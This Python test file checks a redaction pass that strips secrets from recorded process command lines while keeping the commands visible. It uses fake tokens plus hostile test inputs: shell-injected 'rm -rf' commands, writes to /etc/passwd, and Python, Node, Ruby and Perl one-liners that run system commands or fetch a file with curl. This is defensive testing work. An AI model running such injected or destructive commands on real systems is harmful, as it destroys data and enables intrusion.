"""T27-9 (docs/46): the last pass that strikes subscripts and tuples (strike_structured).

What reaches the black box goes through three hands: Tetragon, the process sensor (procs) and,
when it is recorded, redact() again over procs' output (``_box``). The pass runs at the end of
redact's strike_text and at the end of procs' patterns. Each property of docs/46, section 4, is
checked on redact, procs, the chain and the box; the hostile cases compare every barrier with
and without the pass (the pass monkeypatched out), which is what "it can only add strikes"
means.
"""

import importlib
import itertools
import json
from collections.abc import Callable
from pathlib import Path

import pytest

from backtide.blackbox.redact import strike_structured, strike_text
from backtide.blackbox.secret_words import FLAG_WORDS, SENSITIVE_WORDS
from backtide.sensors import procs
from backtide.sensors.procs import safe_text
from tests.scaling import assert_linear
from tests.test_secret_words_parity import _tetragon

# The module, not the function the package exports under the same name.
redact_mod = importlib.import_module("backtide.blackbox.redact")

_S = "Qx7vR2mK9pLt4ZwB"  # noqa: S105 - a fake
_T = "Vb6Yc1Df5Gh0JqR2"  # noqa: S105 - a fake
CMD = "rm -rf /w"
PY = "/usr/bin/python3"
# Never inside a struck region (docs/46, section 4, property 8): a clean literal is one word.
FORBIDDEN = set("'\"\\\r\n;&|`$<> \t()[]{},")


def _chain(text: str, binary: str = PY) -> str:
    return safe_text(_tetragon(text, binary), tool=binary)


def _box(text: str, binary: str = PY) -> str:
    """What is stored: the black box's redact() over procs' reading of Tetragon's line."""
    return strike_text(_chain(text, binary))


def _all(text: str, binary: str = PY) -> dict[str, str]:
    return {
        "redact": strike_text(text),
        "procs": safe_text(text, tool=binary),
        "chain": _chain(text, binary),
        "box": _box(text, binary),
    }


@pytest.fixture
def without_the_pass(monkeypatch: pytest.MonkeyPatch) -> Callable[[str, str], dict[str, str]]:
    """Every barrier as it was before T27-9."""

    def outputs(text: str, binary: str) -> dict[str, str]:
        with monkeypatch.context() as m:
            m.setattr(
                redact_mod, "strike_structured", lambda text, words=None, on_strike=None: text
            )
            m.setattr(procs, "strike_structured", lambda text, words=None, on_strike=None: text)
            return _all(text, binary)

    return outputs


# The forms of docs/46, section 6, as Tetragon writes them (an element with a space wrapped in
# "…", nothing escaped): (binary, the arguments after argv[0], the secrets).
COVERED = [
    (PY, f"-c \"import os; os.environ['X_TOKEN']='{_S}'\""),
    (PY, f'-c "import os; os.environ["X_TOKEN"]="{_S}""'),
    (PY, f"-c \"os.environ['GITHUB_TOKEN'] = '{_S}'\""),
    (PY, f"-c d['password']='{_S}'"),
    (PY, f'-c "cfg["api_key"] = "{_S}""'),
    ("/usr/bin/perl", f'-e $ENV{{API_KEY}}="{_S}"'),
    ("/usr/bin/perl", f"-e $ENV{{'API_TOKEN'}}='{_S}'"),
    ("/usr/bin/ruby", f'-e ENV["X_TOKEN"]="{_S}"'),
    ("/usr/bin/ruby", f"-e ENV['X_TOKEN']='{_S}'"),
    ("/usr/bin/ruby", f"-e \"ENV['X_TOKEN'] ||= '{_S}'\""),
    ("/usr/bin/ruby", f"-e \"cfg[:api_key] = '{_S}'\""),
    ("/usr/bin/node", f'-e process.env["X_TOKEN"]="{_S}"'),
    ("/usr/bin/node", f"-e process.env.X_TOKEN='{_S}'"),
    ("/bin/sh", f"-c \"python3 -c \"import os; os.environ['X_TOKEN']='{_S}'\"\""),
    ("/bin/sh", f"-c \"python3 -c \\\"d['token']='{_S}'\\\" && rm -rf /w\""),
    (PY, f"-c \"d['token']='{_S}'; d['password']='{_T}'\""),
    (PY, f"-c \"requests.get(url, auth=('user','{_S}'))\""),
    (PY, f'-c "requests.get(url, auth=("u", "{_S}"))"'),
    (PY, f"-c auth=('u','{_S}')"),
    (PY, f"-c connect(password='{_S}')"),
    (PY, f'-c "connect(host="h", password="{_S}")"'),
    (PY, f"-c \"d['password'] = ('u', '{_S}')\""),
    (PY, f"-c \"get(u, auth=(str(1), '{_S}'))\""),
    (PY, f"-c \"get(auth=('u','{_S}')); get(auth=('v','{_T}'))\""),
    (PY, f"-c \"get(u, auth=BasicAuth('u', '{_S}'))\""),
    ("/bin/sh", f"-c \"python3 -c \"get(u, auth=('u','{_S}'))\"; rm -rf /w\""),
]


@pytest.mark.parametrize(("binary", "text"), COVERED)
def test_the_box_strikes_every_covered_form(binary: str, text: str) -> None:
    box = _box(text, binary)
    assert _S not in box, box
    assert _T not in box, box


# Free text (a retained request's body, a file event): redact alone, with its words.
@pytest.mark.parametrize(
    "text",
    [
        f"os.environ['X_TOKEN']='{_S}'",
        f'cfg["api_key"] = "{_S}"',
        f"$ENV{{'API_TOKEN'}}='{_S}'",
        f"cfg[:api_key] = '{_S}'",
        f"password='{_S}'",
        f'{{"code": "d[\\"password\\"]=\\"{_S}\\""}}',
        f"d['password'] = ('u', '{_S}')",
    ],
)
def test_redact_strikes_the_forms_in_free_text(text: str) -> None:
    assert _S not in strike_text(text), strike_text(text)


# The accepted residue (docs/23, section 5; docs/46, section 6): strict, so a form that starts
# being struck is moved to COVERED and the documents are updated.
RESIDUE = [
    ("/usr/bin/perl", f"-e $ENV{{API_KEY}}={_S};"),  # not quoted
    ("/bin/bash", f"-c cfg[api_key]={_S}"),
    (PY, f"-c \"d['token']='{_S} two words'\""),  # whitespace: may span two argv elements
    (PY, f"-c d['token']='{_S}!$x'"),  # a shell character
    (PY, f"-c d['token']='{_S}(x)'"),  # a bracket or a comma (review of T27-9a)
    (PY, f"-c d['token']='{_S},x'"),
    (PY, f"-c d['token']='{_S}<x'"),
    (PY, f"-c d['token']='{_S}>x'"),
    (PY, f"-c d['token']='{_S};x'"),
    (PY, f"-c d['token']='{_S}&x'"),
    (PY, f"-c d['token']='{_S}|x'"),
    (PY, f"-c \"d['token']='a' '{_S}'\""),  # split by adjacency
    (
        PY,
        f'-c {{\\"code\\": \\"token=(\\\\\\"alice\\\\\\",\\\\\\"{_S}\\\\\\")',
    ),  # JSON-escaped tuple
    (PY, f"-c \"d['token']='a'+'{_S}'\""),  # split
    (PY, f"-c \"x = os.getenv('X_TOKEN', '{_S}')\""),
    (PY, f"-c \"HTTPBasicAuth('u', '{_S}')\""),  # a call with no secret name
    (PY, f"-c \"s.login('u', '{_S}')\""),
    (PY, f"-c f(token=('{_S}'))"),  # today's name=value rule takes the "("
]


@pytest.mark.parametrize(("binary", "text"), RESIDUE)
def test_the_accepted_residue_still_leaks(binary: str, text: str) -> None:
    assert _S in _box(text, binary)


def test_auth_tuples_are_a_command_line_form_only() -> None:
    """``auth`` is no word of redact's (prose: "auth=(…)" in free text is left, decision 4)."""
    text = f"auth=('u','{_S}')"
    assert _S in strike_text(text)
    assert _S not in safe_text(text, tool=PY)


# 1-3. The program, what follows the value and the name stay.
@pytest.mark.parametrize(
    ("binary", "text", "kept"),
    [
        ("/bin/sh", f"-c \"python3 -c \\\"d['token']='{_S}'\\\" && rm -rf /w\"", ["python3", CMD]),
        ("/bin/sh", f"-c \"ruby -e \\\"ENV['X_TOKEN']='{_S}'\\\"; curl https://h.invalid/x\"",
         ["ruby", "curl https://h.invalid/x"]),
        ("/bin/sh", f"-c \"perl -e '$ENV{{API_KEY}}=\\\"{_S}\\\"' | tee log\"",
         ["perl", "tee log"]),
        (PY, f"-c \"os.environ['GITHUB_TOKEN']='{_S}'\"", ["os.environ['GITHUB_TOKEN']="]),
        (PY, f"-c \"requests.get(url, auth=('alice', '{_S}'))\"", ["'alice'", "url"]),
    ],
)  # fmt: skip
def test_the_program_the_name_and_what_follows_stay(
    binary: str, text: str, kept: list[str]
) -> None:
    for name, out in _all(text, binary).items():
        if name == "redact" and "auth=" in text:
            continue  # free text: not redact's (decision 4)
        assert _S not in out, (name, out)
        for word in kept:
            assert word in out, (name, word, out)


# 5-6. What is not a clean literal, and what only looks like the forms, is left as it was.
LOOK_ALIKES = [
    "d['tokens'] = 3",
    "d['token_count'] = 4",
    "x = cfg['password_hint']",
    "cfg['password_hint'] = 'type it'",
    "f(tokens=(1, 2))",
    "x = (a, b); arr[i] = 3; m{k} = 2",
    "if d['token'] == 'x': pass",
    "d['author']='me'",
    "password=getpass()",
    "token=get_token('name')",
    "password=input('Password:')",
    "os.environ['TOKEN']=os.getenv('X')",
    "$ENV{TOKEN}=$x;",
    "d['password']=$PW",
    "d['token'] =~ /x/",
    "%h = (token => 1)",
    "the token field ['a', 'b']",
    "d['api_key'] = d['other']",
    "d['password']=x",
]


@pytest.mark.parametrize("text", LOOK_ALIKES)
@pytest.mark.parametrize("words", [SENSITIVE_WORDS, FLAG_WORDS])
def test_the_pass_leaves_a_look_alike(text: str, words: str) -> None:
    assert strike_structured(text, words) == text
    assert strike_structured(f'-c "{text}"', words) == f'-c "{text}"'


@pytest.mark.parametrize("text", LOOK_ALIKES)
def test_no_barrier_changes_a_look_alike_with_the_pass(
    text: str, without_the_pass: Callable[[str, str], dict[str, str]]
) -> None:
    line = f'-c "{text}"'
    assert _all(line, PY) == without_the_pass(line, PY)


def _hostile() -> list[tuple[str, str]]:
    """Yesterday's chain regressions and the second review's cases (fixture, "PW" standing for
    a secret), the attempt's ACROSS and UNCLOSED lists, literals that span argv elements, and
    the anchors of docs/46 around separators, substitutions, escapes and unclosed quotes."""
    path = Path(__file__).parent / "fixtures" / "structured_hostile.json"
    cases = [(b, t.replace("PW", _S)) for b, t in json.loads(path.read_text())]
    cases += [
        ("/bin/sh", '-c "echo "token=(\'" ; rm -rf /w ; echo "\')""'),
        ("/bin/sh", "-c \"echo 'token=(\"' ; rm -rf /w ; echo '\")'\""),
        ("/bin/sh", "-c \"d['token']='\" ; rm -rf /w ; echo \"'\""),
        ("/bin/sh", "-c \"d['token']=('\" ; rm -rf /w ; echo \"')\""),
        ("/bin/sh", "-c \"x d['token']=\"' ; rm -rf /w ; echo '\"\""),
        ("/usr/bin/env", "-c \"d['token']=('\" ; rm -rf /w ; echo \"')\""),
        ("/bin/sh", '-c "token=(; rm -rf /w"'),
        ("/bin/sh", '-c "token=(a & rm -rf /w"'),
        ("/bin/sh", '-c "token=(\'a; rm -rf /w"'),
        ("/usr/bin/env", "TOKEN=('a rm -rf /w"),
        ("/usr/bin/env", "d['token']='a rm -rf /w'"),
        ("/usr/bin/env", 'd["token"]="a rm -rf /w"'),
        ("/usr/bin/env", "x auth=('u','a rm -rf /w')"),
        # A shell or Perl operator between two strings (review of T27-9a): seen, not noted.
        ("/bin/sh", "-c echo x'd[token]='>/etc/passwd'y'"),
        ("/bin/sh", "-c cat x'd[token]='<f'y'"),
        ("/bin/sh", "-c echo x'd[token]=';id'y'"),
        ("/bin/sh", "-c echo x'd[token]='&id'y'"),
        ("/bin/sh", "-c echo x'd[token]='|id'y'"),
        ("/usr/bin/perl", "-e print('d[token]=',unlink,'')"),
        # The design's five uncovered secrets: a strike of a bare word took the anchor of the
        # box's redact() (docs/46, section 6).
        (PY, f"-c d['token']=dpassword=\t{_S}"),
        (PY, f'-c d["token"]=dpassword=\t{_S}'),
        ("/usr/bin/perl", f"-e $ENV{{API_KEY}}=dpassword=\t{_S}"),
        (PY, f"-c d['token']=dtoken=\t{_S}"),
        (PY, f"-c auth=(dpassword=\t{_S}"),
    ]
    anchors = [
        "d['token']=",
        'd["token"] = ',
        "$ENV{API_KEY}=",
        "ENV['X_TOKEN'] ||= ",
        "auth=(",
        "f(token=(",
        "auth=BasicAuth(",
        "d['password'] = (",
        "password=",
    ]
    for anchor, q, outer in itertools.product(anchors, "'\"", "'\""):
        for shape in (
            f"echo {outer}{anchor}{q}{outer} ; {CMD} ; echo {outer}{q}){outer}",
            f"echo {outer}{anchor}{q}{outer} && {CMD} | echo {outer}{q}){outer}",
            f"{anchor}{q}$({CMD}){q}",
            f"{anchor}{q}`{CMD}`{q}",
            f"{anchor}{q}x{q} > /etc/x; {CMD}",
            f"{anchor}{q}x\\{q} ; {CMD} ; {q}",
            f"{anchor}{q}x\n{CMD}{q}",
            f"{anchor}{q}x {CMD}",
            f"{anchor}(({q}x{q}), {q}{_S}{q}) ; {CMD}",
            f"{anchor}{q}{_S}{q}, {q}{_S}{q}) && {CMD}",
        ):
            for binary in ("/bin/sh", "/usr/bin/env", PY):
                cases += [(binary, f'-c "{shape}"'), (binary, f"-c {shape}")]
    return cases


HOSTILE = _hostile()
# What must stay visible: a command and the operators that join one to a string.
COMMANDS = [CMD, ">/etc/passwd", "<f", ";id", "&id", "|id", "unlink"]


def test_the_hostile_cases_are_many() -> None:
    assert len(HOSTILE) > 1000


@pytest.mark.parametrize(("binary", "text"), HOSTILE)
def test_the_pass_only_adds_strikes(
    binary: str, text: str, without_the_pass: Callable[[str, str], dict[str, str]]
) -> None:
    """9 and 2: nothing struck before comes back, and no command stops being seen."""
    before = without_the_pass(text, binary)
    after = _all(text, binary)
    for name in after:
        if _S not in before[name]:
            assert _S not in after[name], (name, after[name])
        for command in COMMANDS:
            if command in before[name]:
                assert command in after[name], (name, command, after[name])


def test_the_hostile_cases_hold_a_secret_and_the_operators() -> None:
    texts = [text for _, text in HOSTILE]
    assert any(f"dpassword=\t{_S}" in text for text in texts)
    for command in COMMANDS:
        assert any(command in text for text in texts), command


def test_the_fixture_turns_the_pass_off(
    without_the_pass: Callable[[str, str], dict[str, str]],
) -> None:
    """Else the comparisons above would pass with nothing to compare."""
    for binary, text in [("/usr/bin/ruby", f"-e \"cfg[:api_key] = '{_S}'\""), *COVERED[-3:]]:
        assert _S in without_the_pass(text, binary)["box"], text
        assert _S not in _all(text, binary)["box"], text


@pytest.mark.parametrize(("binary", "text"), HOSTILE)
def test_a_struck_region_is_one_word_and_twice_is_once(binary: str, text: str) -> None:
    """8 and 11: what the pass strikes holds no quote, backslash, whitespace or shell
    character, and its output goes through it unchanged (the box runs redact() again)."""
    for words in (SENSITIVE_WORDS, FLAG_WORDS):
        for start, end in redact_mod._structured_spans(text, words):
            assert FORBIDDEN.isdisjoint(text[start:end]), (text, text[start:end])
    after = _all(text, binary)
    assert strike_structured(after["box"]) == after["box"]
    assert strike_structured(after["chain"], FLAG_WORDS) == after["chain"]


# 7. What does not close strikes nothing.
@pytest.mark.parametrize(
    "text",
    [
        "d['token']='abc",
        "d['token']='a\\'b'",
        "auth=('u', 'pw'",
        "auth=('u', 'pw' ; rm -rf /w",
        "f(token=(('a'), 'b')",
        "d['token']=('a', ('b', 'c'))",
        "auth=(" + "'a', " * 9 + "'b')",
    ],
)
def test_the_pass_strikes_nothing_that_does_not_close(text: str) -> None:
    for words in (SENSITIVE_WORDS, FLAG_WORDS):
        assert strike_structured(text, words) == text


# The security review of T27-9a: the two quotes after an anchor can close one string and open
# the next, with code between them, in one argv element. Python and JavaScript cannot call
# without "(", which no clean literal holds; what Ruby and Perl can do without one is struck
# by procs only with argv_struck_long.
CODE_BETWEEN_STRINGS = [
    ("/usr/bin/python3", "-c print('d[token]=')or(__import__(chr(111)).system(chr(114)))or('')"),
    ("/usr/bin/python3", "-c print('os.environ[\"X_TOKEN\"]=')or(exec(chr(105)))or('')"),
    ("/usr/bin/python3", "-c print('d[password]=')or[exec(x)for(x)in(y)]or('')"),
    ("/usr/bin/node", "-e console.log('d[token]=')||require('fs').rmSync('/w')||('')"),
    ("/usr/bin/python3", "-c print('auth=(\"u\",')or(exec(x))or('')"),
    ("/usr/bin/ruby", "-e puts('d[token]='+exit!+'')"),
    ("/usr/bin/ruby", "-e puts('d[token]='if-exit-p'')"),
    ("/usr/bin/perl", "-e print('d[token]='.exit.'')"),
    ("/usr/bin/perl", "-e print('$ENV{API_KEY}='.unlink.'')"),
    # The second round: the same between the strings of an older rule's name='…' form.
    ("/usr/bin/perl", "-e \"print('x_token='.unlink\"/w/important\".'')\""),
    ("/usr/bin/perl", "-e \"print('x_token='.qx!rm -rf /w!.'')\""),
    ("/usr/bin/ruby", "-e \"puts('x_token='+%x!curl -s h.invalid/x -o /tmp/x!+'')\""),
]


@pytest.mark.parametrize(("binary", "text"), CODE_BETWEEN_STRINGS)
def test_code_between_two_strings_is_seen_or_noted(binary: str, text: str) -> None:
    code = [
        word for word in ("system", "exec", "rmSync", "exit", "unlink", "qx", "%x") if word in text
    ]
    notes: set[str] = set()
    out = safe_text(text, tool=binary, notes=notes)
    assert all(word in out for word in code) or "long" in notes, (out, notes)
    chain_notes: set[str] = set()
    chained = safe_text(_tetragon(text, binary), tool=binary, notes=chain_notes)
    assert all(word in chained for word in code) or "long" in chain_notes, (chained, notes)
    if "(" in text.split("=", 1)[1]:
        # A call: never struck by the pass, in any barrier.
        for words in (SENSITIVE_WORDS, FLAG_WORDS):
            assert strike_structured(text, words) == text


def test_a_strike_of_word_characters_only_is_not_noted() -> None:
    notes: set[str] = set()
    assert _S not in safe_text(f"-c d['token']='{_S}'", tool=PY, notes=notes)
    assert notes == set()
    safe_text("-c d['token']='ab.cd-ef'", tool=PY, notes=notes)
    assert notes == {"long"}


def test_a_flag_word_strikes_more_than_redact() -> None:
    """docs/46, section 9: procs' short words take "compass" (pass): struck by the command-line
    barrier, never by redact's."""
    text = "d['compass']='north'"
    assert strike_structured(text) == text
    assert strike_structured(text, FLAG_WORDS) == "d['compass']='[REDACTED]'"


def test_free_text_has_no_mark_for_code_without_brackets() -> None:
    """The accepted residue of the review of T27-9a: Ruby or Perl between two strings in free
    text (a request body, a file event) is struck with no note; procs notes it."""
    for text in ("puts('d[token]='+exit!+'')", "print('d[token]='.exit.'')"):
        assert "exit" not in strike_text(text)
        notes: set[str] = set()
        safe_text(f"-e {text}", tool="/usr/bin/ruby", notes=notes)
        assert notes == {"long"}


def test_the_struck_value_is_the_literal_only() -> None:
    assert strike_structured(f"d['token'] = '{_S}' # x") == "d['token'] = '[REDACTED]' # x"
    assert strike_structured(f'd[\\"token\\"]=\\"{_S}\\"') == 'd[\\"token\\"]=\\"[REDACTED]\\"'
    assert strike_structured(f"token = ('{_S}')") == "token = ('[REDACTED]')"
    assert (
        strike_structured(f"auth=('u', '{_S}', '{_T}')", FLAG_WORDS)
        == "auth=('u', '[REDACTED]', '[REDACTED]')"
    )


UNITS = [
    "d['token']='",
    "d['token']=('a', ",
    "d['token']=('a',",
    "auth=(",
    "auth=((((((",
    "token=('a',",
    "auth=[REDACTED]'u', ",
    "auth=[REDACTED] ,",
    "auth=***** 'a', ",
    '$ENV{API_KEY}="x" ',
    "$ENV{API_KEY}=",
    "password='a' ",
    "password=",
    "['token']",
    "['token']=",
    "[:api_key]='a'",
    "ENV['X_TOKEN'] ||= ",
    "os.environ['X_TOKEN']='a';",
    'd[\\"token\\"]=\\"',
]


@pytest.mark.parametrize("unit", UNITS)
def test_the_pass_stays_linear(unit: str) -> None:
    """12: the anchors are searched once each per position the pass moves past."""
    size = 64 * 1024
    small = unit * (size // 8 // len(unit))
    large = unit * (size // len(unit))
    for words in (SENSITIVE_WORDS, FLAG_WORDS):
        assert_linear(
            lambda text, words=words: strike_structured(text, words),
            small,
            large,
            8,
            floor=0.01,
            cap=2.0,
            label=f"{unit!r}",
        )
    # Where it runs: at the end of redact's patterns and of procs' (with its windows).
    assert_linear(strike_text, small, large, 8, floor=0.01, cap=2.0, label=f"redact {unit!r}")
    assert_linear(
        lambda text: safe_text(text, tool=PY), small, large, 8, floor=0.01, cap=2.0,
        label=f"procs {unit!r}",
    )  # fmt: skip
